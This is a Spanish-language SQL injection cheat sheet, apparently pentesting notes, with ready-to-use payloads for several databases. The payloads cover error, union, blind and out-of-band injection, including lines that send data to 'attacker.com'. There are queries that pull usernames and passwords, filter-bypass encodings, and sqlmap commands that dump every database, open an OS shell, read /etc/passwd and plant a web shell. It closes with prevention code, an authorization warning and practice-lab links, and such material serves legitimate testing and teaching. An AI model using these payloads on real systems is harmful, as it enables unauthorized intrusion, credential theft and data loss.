# SQL Injection

## ¿Qué es SQL Injection?

SQL Injection es una vulnerabilidad que permite a un atacante interferir con las consultas que una aplicación hace a su base de datos. Puede permitir ver, modificar o eliminar datos.

## Tipos de SQL Injection

### 1. In-Band SQLi (Classic)

#### Error-Based
La base de datos devuelve mensajes de error que revelan información.

```sql
' OR 1=1 --
" OR 1=1 --
' OR '1'='1
') OR ('1'='1
```

#### Union-Based
Usa el operador UNION para combinar resultados de múltiples SELECT.

```sql
' UNION SELECT NULL--
' UNION SELECT NULL, NULL--
' UNION SELECT NULL, NULL, NULL--

' UNION SELECT 1,2,3--
' UNION SELECT @@version, NULL, NULL--
' UNION SELECT table_name, NULL, NULL FROM information_schema.tables--
```

### 2. Blind SQLi

#### Boolean-Based
La aplicación responde de manera diferente según si la consulta es verdadera o falsa.

```sql
' AND 1=1--  (True)
' AND 1=2--  (False)

' AND (SELECT 'a' FROM users LIMIT 1)='a'--
' AND LENGTH(database())>5--
' AND ASCII(SUBSTRING(database(),1,1))>100--
```

#### Time-Based
La respuesta se retrasa según el resultado de la consulta.

```sql
-- MySQL
' AND SLEEP(5)--
' OR IF(1=1, SLEEP(5), 0)--

-- PostgreSQL
'; SELECT pg_sleep(5)--

-- MSSQL
'; WAITFOR DELAY '00:00:05'--

-- Oracle
' AND DBMS_LOCK.SLEEP(5)--
```

### 3. Out-of-Band SQLi
Usa un canal diferente para extraer datos (DNS, HTTP).

```sql
-- MySQL (Windows)
' UNION SELECT LOAD_FILE('\\\\attacker.com\\a')--

-- MSSQL
'; exec master..xp_dirtree '\\\\attacker.com\\a'--
```

## Detección

### Caracteres para probar
```
'
"
`
')
")
`)
'))
"))
`))
```

### Respuestas que indican SQLi
- Errores de SQL
- Diferencias en la respuesta
- Retrasos en tiempo
- Cambios en el comportamiento

## Explotación Manual

### Paso 1: Encontrar el número de columnas

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
-- Continuar hasta obtener error

-- O usar UNION
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

### Paso 2: Encontrar columnas visibles

```sql
' UNION SELECT 1,2,3--
' UNION SELECT 'a','b','c'--
```

### Paso 3: Enumerar base de datos

```sql
-- MySQL
' UNION SELECT @@version, database(), user()--
' UNION SELECT NULL, table_name, NULL FROM information_schema.tables WHERE table_schema=database()--
' UNION SELECT NULL, column_name, NULL FROM information_schema.columns WHERE table_name='users'--

-- PostgreSQL
' UNION SELECT NULL, version(), NULL--
' UNION SELECT NULL, table_name, NULL FROM information_schema.tables--

-- MSSQL
' UNION SELECT NULL, @@version, NULL--
' UNION SELECT NULL, name, NULL FROM sysobjects WHERE xtype='U'--

-- Oracle
' UNION SELECT NULL, banner, NULL FROM v$version--
' UNION SELECT NULL, table_name, NULL FROM all_tables--
```

### Paso 4: Extraer datos

```sql
' UNION SELECT NULL, username, password FROM users--
' UNION SELECT NULL, CONCAT(username,':',password), NULL FROM users--
```

## SQLMap

### Comandos básicos

```bash
# Test básico
sqlmap -u "http://example.com/page.php?id=1"

# Con método POST
sqlmap -u "http://example.com/page.php" --data "id=1&submit=Submit"

# Con cookies
sqlmap -u "http://example.com/page.php?id=1" --cookie="PHPSESSID=abc123"

# Desde request de Burp
sqlmap -r request.txt

# Especificar parámetro vulnerable
sqlmap -u "http://example.com/page.php?id=1&user=test" -p id
```

### Enumeración

```bash
# Listar bases de datos
sqlmap -u "http://example.com/page.php?id=1" --dbs

# Tablas de una BD
sqlmap -u "http://example.com/page.php?id=1" -D database_name --tables

# Columnas de una tabla
sqlmap -u "http://example.com/page.php?id=1" -D database_name -T users --columns

# Dump de una tabla
sqlmap -u "http://example.com/page.php?id=1" -D database_name -T users --dump

# Dump completo
sqlmap -u "http://example.com/page.php?id=1" --dump-all

# Buscar columnas específicas
sqlmap -u "http://example.com/page.php?id=1" -D database_name --search -C password
```

### Opciones avanzadas

```bash
# Especificar DBMS
sqlmap -u "http://example.com/page.php?id=1" --dbms=mysql

# Nivel y riesgo (1-5)
sqlmap -u "http://example.com/page.php?id=1" --level=3 --risk=2

# Técnicas específicas
# B: Boolean-based blind
# E: Error-based
# U: Union query-based
# S: Stacked queries
# T: Time-based blind
# Q: Inline queries
sqlmap -u "http://example.com/page.php?id=1" --technique=BEUST

# Bypass WAF
sqlmap -u "http://example.com/page.php?id=1" --tamper=space2comment

# Random agent
sqlmap -u "http://example.com/page.php?id=1" --random-agent

# Proxy
sqlmap -u "http://example.com/page.php?id=1" --proxy="http://127.0.0.1:8080"
```

### Command execution

```bash
# OS Shell
sqlmap -u "http://example.com/page.php?id=1" --os-shell

# SQL Shell
sqlmap -u "http://example.com/page.php?id=1" --sql-shell

# Leer archivo
sqlmap -u "http://example.com/page.php?id=1" --file-read="/etc/passwd"

# Escribir archivo
sqlmap -u "http://example.com/page.php?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
```

## Bypass de Filtros

### Comentarios

```sql
-- MySQL
/* comment */
# comment
-- comment
;%00

-- MSSQL
/* comment */
-- comment

-- Oracle
-- comment
```

### Espacios

```sql
-- Tabs y newlines
SELECT/**/username/**/FROM/**/users

-- Plus sign (URL encoded space)
SELECT+username+FROM+users

-- Parentheses
SELECT(username)FROM(users)
```

### Case manipulation

```sql
SeLeCt * FrOm users
sELEct * fROM users
```

### Equivalentes

```sql
-- AND
&&

-- OR
||

-- = (equals)
LIKE
REGEXP
BETWEEN

-- Ejemplo
admin' OR 'a'='a
admin' OR 1=1--
admin' OR 'a' LIKE 'a
```

### Encoding

```sql
-- URL encoding
%27 = '
%23 = #
%2d%2d = --

-- Double URL encoding
%2527 = '

-- Unicode
%u0027 = '
```

## Prevención

### Prepared Statements (Mejor práctica)

```php
// PHP con PDO
$stmt = $pdo->prepare('SELECT * FROM users WHERE id = :id');
$stmt->execute(['id' => $id]);
```

```python
# Python
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
```

```javascript
// Node.js
connection.query('SELECT * FROM users WHERE id = ?', [userId]);
```

### Input Validation

```php
// Validar tipo de dato
if (!is_numeric($id)) {
    die("Invalid input");
}

// Whitelist de caracteres permitidos
if (!preg_match('/^[a-zA-Z0-9_]+$/', $username)) {
    die("Invalid username");
}
```

### Escaping (No recomendado como única medida)

```php
// PHP
$id = mysqli_real_escape_string($conn, $id);
```

### Stored Procedures

```sql
CREATE PROCEDURE GetUser(@id INT)
AS
BEGIN
    SELECT * FROM users WHERE id = @id
END
```

### Least Privilege

```sql
-- Usuario de BD solo con permisos SELECT
GRANT SELECT ON database.* TO 'webapp'@'localhost';
```

## Checklist de Testing

- [ ] Probar todos los parámetros (GET, POST, Headers, Cookies)
- [ ] Intentar caracteres especiales: `' " ` -- /* */`
- [ ] Verificar mensajes de error
- [ ] Probar ORDER BY para encontrar número de columnas
- [ ] Intentar UNION SELECT
- [ ] Probar Boolean-based blind
- [ ] Probar Time-based blind
- [ ] Intentar extraer versión de BD
- [ ] Enumerar tablas y columnas
- [ ] Intentar leer archivos del sistema
- [ ] Documentar hallazgos con evidencia

## Notas Importantes

> [!WARNING]
> **IMPORTANTE:**
> - SQLi puede causar pérdida de datos
> - Siempre ten autorización por escrito
> - No uses `--dump-all` sin permiso explícito
> - Documenta cada intento

> [!TIP]
> **Consejos:**
> - Empieza con técnicas menos invasivas
> - Guarda logs de todas tus pruebas
> - Usa `--batch` en SQLMap para modo no interactivo
> - Combina técnicas manuales y automatizadas

## Laboratorios de Práctica

- [PortSwigger SQL Injection Labs](https://portswigger.net/web-security/sql-injection)
- [DVWA (Damn Vulnerable Web Application)](http://www.dvwa.co.uk/)
- [SQLi Labs](https://github.com/Audi-1/sqli-labs)
- [HackTheBox](https://www.hackthebox.eu/)

## Referencias

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [SQLMap Documentation](https://github.com/sqlmapproject/sqlmap/wiki)
- [PayloadsAllTheThings - SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
- [PentestMonkey SQL Injection Cheat Sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/sql-injection-cheat-sheet)
